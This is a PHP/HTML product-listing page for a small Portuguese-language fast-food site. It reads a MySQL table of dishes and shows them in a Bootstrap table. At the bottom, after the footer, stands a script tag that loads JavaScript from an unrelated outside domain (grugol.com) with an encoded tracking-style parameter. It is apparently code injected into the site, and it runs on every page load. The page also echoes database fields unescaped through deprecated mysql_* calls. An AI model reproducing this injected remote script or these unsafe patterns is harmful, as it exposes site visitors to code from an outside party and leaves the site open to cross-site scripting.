<!DOCTYPE html>
<html>
<?php 
  require_once 'includes/connect_db.php';
  if (!isset($_SESSION)) session_start();
?>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>fastfood v1 - Start</title>
  <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  <!-- Include all compiled plugins (below), or include individual files as needed -->
  <script src="bootstrap/js/bootstrap.min.js"></script>
  <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
  <script type="text/javascript" src="jquery.quick.search.js"></script>
  <link rel="stylesheet" href="css/style.css">
</head>
<body>
<div class="container">

<?php include "menu.php" ?>
<?php
  if (isset($_GET['msg'])) {
  $msg = $_GET['msg'];
  switch ($msg) {
  case 2:
?>
<div class="alert alert-success" role="alert" 
 style="height:relative;width:690px;left: 325px;margin-top:-5px;text-align:center;">
  <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  <span class="glyphicon glyphicon-ok" aria-hidden="true"></span>
  Você foi autenticado com sucesso!
</div>
<?php
    }
  }
?> 

<div class="row marketing" style="border: 1px solid rgb(225, 232, 237); border-radius: 4px; ">
  <div class="col-lg-10">
  <h4>O que você irá comer?</h4>

<table class="table" style="margin-top:10px;margin-left:55px;">
  <thead>
    <tr> 
      <td style="font-weight:bold;">Categoria</td>
      <td style="font-weight:bold;">Nome</td>
      <td style="font-weight:bold;">Foto</td>
      <td style="font-weight:bold;">Valor</td>
    </tr>
  </thead>
<?php 
  $resultado = mysql_query("SELECT * FROM tab_prod ORDER BY valor DESC",$dbconn);
  if ($resultado) {
  while ($row = mysql_fetch_assoc($resultado)) {
?>
<tbody>
  <td>
    <?php echo "<p></p>", $row['categoria'] ?>
  </td>
  <td>
    <?php echo "<p></p>", $row['pro_nome'] ?>
  </td>
  <td class="img-circle">
    <img src="<?php echo $row['pro_foto'] ?>" class="img-thumbnail" style="width:70px;height:70px;"">
  </td>
  <td>
    <?php echo "<p></p>R$", $row['valor'] ?>
  </td>
</tbody>
<?php 
    }
  }
mysql_close($dbconn);
?>
</table>

    </div>
</div>

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>

  
</body>
</html>